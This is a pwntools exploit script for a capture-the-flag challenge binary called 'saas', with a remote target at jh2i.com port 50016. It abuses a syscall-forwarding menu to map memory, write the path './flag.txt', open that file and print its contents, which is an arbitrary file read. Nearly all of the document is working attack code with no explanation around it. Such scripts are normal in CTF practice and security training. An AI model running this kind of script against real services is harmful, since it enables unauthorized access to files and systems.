from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'

TARGET = './saas'
HOST = 'jh2i.com'
PORT = 50016

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

r = start()
if args.D:
    debug(r, [0x148f])

r.sendlineafter('): ', '9')
r.sendlineafter('): ', str(0x0000654321000000))
r.sendlineafter('): ', str(0x1000))
r.sendlineafter('): ', str(7))
r.sendlineafter('): ', str(0x32))
r.sendlineafter('): ', str(0))
r.sendlineafter('): ', str(0))

r.sendlineafter('): ', '0')
r.sendlineafter('): ', '0')
r.sendlineafter('): ', str(0x0000654321000000))
r.sendlineafter('): ', str(0xa))
r.sendlineafter('): ', str(0))
r.sendlineafter('): ', str(0))
r.sendlineafter('): ', str(0))

r.send('./flag.txt')

r.sendlineafter('): ', '2')
r.sendlineafter('): ', str(0x0000654321000000))
r.sendlineafter('): ', str(0))
r.sendlineafter('): ', str(0))
r.sendlineafter('): ', str(0))
r.sendlineafter('): ', str(0))
r.sendlineafter('): ', str(0))


r.sendlineafter('): ', '0')
r.sendlineafter('): ', str(6))
r.sendlineafter('): ', str(0x0000654321000200))
r.sendlineafter('): ', str(0x100))
r.sendlineafter('): ', str(0))
r.sendlineafter('): ', str(0))
r.sendlineafter('): ', str(0))

r.sendlineafter('): ', '1')
r.sendlineafter('): ', str(1))
r.sendlineafter('): ', str(0x0000654321000200))
r.sendlineafter('): ', str(0x100))
r.sendlineafter('): ', str(0))
r.sendlineafter('): ', str(0))
r.sendlineafter('): ', str(0))

r.interactive()
